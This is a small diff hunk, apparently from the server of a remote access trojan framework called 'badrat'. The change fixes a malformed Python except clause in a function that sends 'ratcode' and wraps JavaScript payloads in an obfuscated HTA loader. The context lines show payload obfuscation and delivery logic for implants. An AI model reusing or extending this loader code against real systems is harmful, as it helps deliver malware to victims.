@@ -344,7 +344,7 @@ def send_ratcode(ratID=None, ratType=None, ip_addr=None):
                 js_source = ratcode.split(b"<script>")[1].split(b"</script>")[0]
                 ratcode = ekript.make_hta_loader_template(ekript.ekript_js(js_source, key), key, ratcode)
 
-        except e:
+        except Exception as e:
             pretty_print("[-] Error sending ad-hoc ratcode: No such rat exists: /rats/badrat." + ratType)
             pretty_print(e)
             return(default_page())
